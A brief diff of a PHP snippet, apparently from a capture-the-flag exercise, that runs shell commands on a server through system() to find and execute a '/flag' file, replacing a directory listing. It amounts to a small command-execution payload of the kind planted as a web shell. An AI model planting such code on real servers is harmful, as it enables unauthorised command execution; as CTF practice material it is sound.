@@ -5,7 +5,7 @@
 <pre>
     <?php
         //system("find / -name 'flag' 2>/dev/null", $result); // 1
-        system("cd /flag && ls -al", $result);
+        system("/flag", $result);
         echo $result;
     ?>
 </pre>
